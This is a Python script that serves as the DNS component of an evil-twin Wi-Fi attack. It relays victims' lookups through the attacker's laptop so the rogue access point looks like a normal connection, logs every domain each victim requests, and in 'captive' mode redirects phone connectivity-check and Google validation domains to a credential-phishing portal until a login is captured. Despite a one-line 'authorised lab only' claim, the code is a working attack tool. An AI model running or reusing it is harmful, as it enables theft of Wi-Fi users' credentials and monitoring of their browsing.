#!/usr/bin/env python3
"""Attacker-gateway DNS resolver for the AL-GHUL evil twin.

Why this exists
  The twin relays its victims out through this laptop (the attacker's backhaul).
  Windows' Internet Connection Sharing refuses to forward a client's DNS to the
  outside, and the upstream phone hotspot blocks external resolvers (port 53), so
  a victim behind the twin cannot resolve names, and the phone shows "no internet",
  which blows the twin's cover. This is the attacker's fix: run our OWN resolver on
  the gateway. The twin forwards every victim lookup here; we resolve it with the
  host's working system resolver and hand back a valid answer. The victim sees a
  perfectly normal connection, and we log every name it asks for.

How it slips past ICS
  Windows ICS already listens on 0.0.0.0:53. We bind the SPECIFIC address
  192.168.137.1:53 with SO_REUSEADDR; on Windows the specific bind takes precedence
  over the wildcard, so the twin's queries (sent to 192.168.137.1:53) land here.

Scope: authorised lab only, the operator's own devices. Names only, never payloads.

Run:  python dns_helper.py            (binds 192.168.137.1:53, the ICS gateway IP)
      python dns_helper.py --bind 192.168.137.1 --log <path>
"""
from __future__ import annotations
import argparse, socket, struct, threading, time, sys
from pathlib import Path

QTYPE = {1: "A", 28: "AAAA", 5: "CNAME", 65: "HTTPS", 15: "MX", 16: "TXT"}

# ---- Captive-portal mode (opt-in via --captive) -----------------------------
# While the victim has NOT "signed in" (the unlock flag is absent), these domains
# resolve to the portal IP so the OS pops its "Sign in to Wi-Fi" sheet. The moment
# the portal captures a credential it drops the unlock flag, and from then on these
# resolve truthfully so the phone gets real internet. One global flag is enough for
# the single-victim lab (the twin NATs every client to one address anyway).
PORTAL_IP = "192.168.137.1"            # where portal_social.py listens (the gateway)
CAPTIVE_MODE = False                    # set True by --captive
UNLOCK_FLAG = Path(__file__).resolve().parent / "portal-unlocked.flag"
CAPTIVE_DOMAINS = {
    # HTTP portal-detection probes (these pop the "Sign in" sheet)
    "connectivitycheck.gstatic.com", "connectivitycheck.android.com",
    "clients3.google.com", "clients4.google.com", "captive.apple.com",
    "www.msftconnecttest.com", "msftconnecttest.com",
    "dns.msftncsi.com", "www.msftncsi.com",
    # HTTPS / fallback VALIDATION hosts - redirect these too, otherwise the phone
    # validates internet over HTTPS and never forces the portal (the bug we hit).
    "www.google.com", "www.gstatic.com", "play.googleapis.com",
    "gstatic.com",
    # the portal's own host (the redirect target)
    "kaffi-fri.login",
}


def portal_locked() -> bool:
    return CAPTIVE_MODE and not UNLOCK_FLAG.exists()


def parse_question(pkt: bytes):
    """Return (qname_str, qtype, qclass, question_bytes) from a DNS query."""
    pos = 12
    labels = []
    while pos < len(pkt):
        ln = pkt[pos]
        if ln == 0:
            pos += 1
            break
        pos += 1
        labels.append(pkt[pos:pos + ln].decode("latin-1"))
        pos += ln
    qtype, qclass = struct.unpack(">HH", pkt[pos:pos + 4])
    pos += 4
    return ".".join(labels), qtype, qclass, pkt[12:pos]


def build_response(query: bytes, question: bytes, qtype: int, ips: list[str], ttl: int = 60) -> bytes:
    tid = query[:2]
    if ips:
        flags = 0x8180            # QR=1, RD=1, RA=1, RCODE=0 (NOERROR)
        ancount = len(ips)
    else:
        flags = 0x8180 if qtype not in (1, 28) else 0x8183  # NXDOMAIN only for A/AAAA misses
        ancount = 0
    header = tid + struct.pack(">HHHHH", flags, 1, ancount, 0, 0)
    body = question
    for ip in ips:
        if qtype == 28:
            rdata = socket.inet_pton(socket.AF_INET6, ip)
        else:
            rdata = socket.inet_aton(ip)
        body += struct.pack(">HHHIH", 0xC00C, qtype, 1, ttl, len(rdata)) + rdata
    return header + body


def resolve(name: str, qtype: int) -> list[str]:
    """Resolve via the host's own (working) system resolver."""
    fam = socket.AF_INET6 if qtype == 28 else socket.AF_INET
    if qtype not in (1, 28):
        return []
    try:
        infos = socket.getaddrinfo(name, None, fam, socket.SOCK_STREAM)
        seen, out = set(), []
        for info in infos:
            ip = info[4][0].split("%")[0]
            if ip not in seen:
                seen.add(ip); out.append(ip)
        return out
    except OSError:
        return []


def handle(sock: socket.socket, data: bytes, cli, logf):
    try:
        name, qtype, qclass, question = parse_question(data)
    except Exception:
        return
    label = QTYPE.get(qtype, str(qtype))
    # Captive-portal redirect: while locked, point probe domains at the portal.
    if name.lower() in CAPTIVE_DOMAINS and portal_locked():
        ips = [PORTAL_IP] if qtype == 1 else []   # A -> portal; AAAA/HTTPS -> nodata, forces v4
        ttl, tag = 5, "  [PORTAL-REDIRECT]"
    else:
        ips = resolve(name, qtype)
        ttl, tag = 60, ""
    line = f"{time.strftime('%H:%M:%S')}  {name}  ({label})  -> {', '.join(ips) if ips else 'no-answer'}{tag}"
    print("DNSLOG", line, flush=True)
    if logf:
        try:
            with open(logf, "a", encoding="utf-8") as f:
                f.write(line + "\n")
        except OSError:
            pass
    resp = build_response(data, question, qtype, ips, ttl)
    try:
        sock.sendto(resp, cli)
    except OSError:
        pass


def main() -> int:
    global CAPTIVE_MODE, PORTAL_IP
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--bind", default="192.168.137.1", help="the gateway IP the twin forwards DNS to")
    ap.add_argument("--port", type=int, default=53)
    ap.add_argument("--log", default="", help="append every lookup to this file")
    ap.add_argument("--captive", action="store_true",
                    help="captive-portal mode: redirect OS probe domains to the portal until sign-in")
    ap.add_argument("--portal-ip", default=PORTAL_IP, help="IP the captive portal listens on")
    args = ap.parse_args()
    CAPTIVE_MODE = args.captive
    PORTAL_IP = args.portal_ip
    if CAPTIVE_MODE:
        # start locked each run so the sheet always pops for a fresh demo
        try: UNLOCK_FLAG.unlink()
        except FileNotFoundError: pass
        print(f"[*] CAPTIVE MODE on: probe domains -> {PORTAL_IP} until the portal unlocks")

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind((args.bind, args.port))
    except OSError as e:
        print(f"[!] bind {args.bind}:{args.port} failed: {e}", file=sys.stderr)
        return 2
    if args.log:
        Path(args.log).parent.mkdir(parents=True, exist_ok=True)
    print(f"[*] attacker DNS resolver up on {args.bind}:{args.port} "
          f"(forwarding victim lookups through the host resolver)")
    while True:
        try:
            data, cli = s.recvfrom(1500)
        except OSError:
            continue
        if len(data) >= 13:
            threading.Thread(target=handle, args=(s, data, cli, args.log), daemon=True).start()


if __name__ == "__main__":
    raise SystemExit(main())
